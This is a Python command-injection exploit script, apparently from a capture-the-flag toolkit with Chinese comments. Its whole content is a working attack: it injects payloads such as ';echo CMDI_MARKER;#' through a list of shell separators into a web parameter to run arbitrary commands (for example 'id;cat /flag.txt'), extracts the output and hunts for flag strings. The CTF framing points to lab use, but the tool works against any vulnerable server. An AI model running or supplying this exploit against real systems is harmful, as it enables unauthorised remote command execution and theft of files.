#!/usr/bin/env python3
"""命令注入利用：探测 + 执行命令回显 / 反连 / 盲注。

用法：
    python3 arsenal/payloads/cmdi_exec.py --url 'http://host/ping.php?ip=127.0.0.1' --param ip --cmd 'id;cat flag.txt'
    python3 arsenal/payloads/cmdi_exec.py --url 'http://host/api' --method POST --data 'ip=127.0.0.1' --param ip --cmd 'id'

成功：输出命令执行结果；失败：输出响应差异摘要。
"""
import argparse
import re
import requests
import sys
import urllib.parse


MARKER = "CMDI_MARKER"


def _probe(url, method, headers, data, param, payload, timeout=15):
    d = (data or "").copy() if data else {}
    if param in d:
        d[param] = payload
    kwargs = {"url": url, "method": method, "headers": headers or {}, "timeout": timeout, "verify": False}
    if method.upper() == "GET":
        kwargs["params"] = {param: payload}
        kwargs["data"] = None
    else:
        kwargs["data"] = d or {param: payload}
    try:
        r = requests.request(**kwargs)
        return r.status_code, len(r.content), r.text
    except Exception as e:
        return -1, 0, str(e)


def main():
    parser = argparse.ArgumentParser(description="命令注入利用脚本")
    parser.add_argument("--url", required=True)
    parser.add_argument("--param", required=True)
    parser.add_argument("--cmd", required=True, help="要执行的命令，如 'id;cat /flag.txt'")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--data", default="", help="POST body 模板")
    parser.add_argument("--headers", default="", help="JSON 字符串")
    parser.add_argument("--timeout", type=int, default=15)
    args = parser.parse_args()

    import json
    headers = json.loads(args.headers) if args.headers else {}
    data = {k: v for k, v in (p.split("=", 1) for p in args.data.split("&") if p)} if args.data else {}

    # 1) 基线
    base_status, base_len, base_text = _probe(args.url, args.method, headers, data, args.param, "BASELINE", args.timeout)
    print(f"[base] status={base_status} len={base_len}")

    # 2) 标记注入
    marker_payload = f";echo {MARKER};#"
    m_status, m_len, m_text = _probe(args.url, args.method, headers, data, args.param, marker_payload, args.timeout)
    print(f"[marker] status={m_status} len={m_len} marker_count={m_text.count(MARKER)}")

    # 3) 执行命令并尝试回显
    separators = [";", "|", "&&", "||", "\n", "${IFS}", "`", "$()"]
    best = None
    for sep in separators:
        payload = f"{sep}{args.cmd}{sep}echo {MARKER}"
        _, _, text = _probe(args.url, args.method, headers, data, args.param, payload, args.timeout)
        if MARKER in text:
            best = text
            print(f"[success] separator={sep!r} cmd_output found")
            break

    if not best:
        print("[verdict] 未找到命令回显，可能需要盲注/OOB")
        return 1

    # 提取命令输出：标记之间的内容
    m = re.search(re.escape(MARKER) + r"(.+?)" + re.escape(MARKER), best, re.S)
    if m:
        output = m.group(1).strip()
        print(f"[cmd_output]\n{output[:2000]}")
    else:
        output = best

    flags = re.findall(r'flag\{[^}]+\}|FLAG_[A-Z0-9_]+|TSCT?\{[^}]+\}|\w{20,}', output, re.I)
    if flags:
        print(f"[flag_candidates] {flags[:10]}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
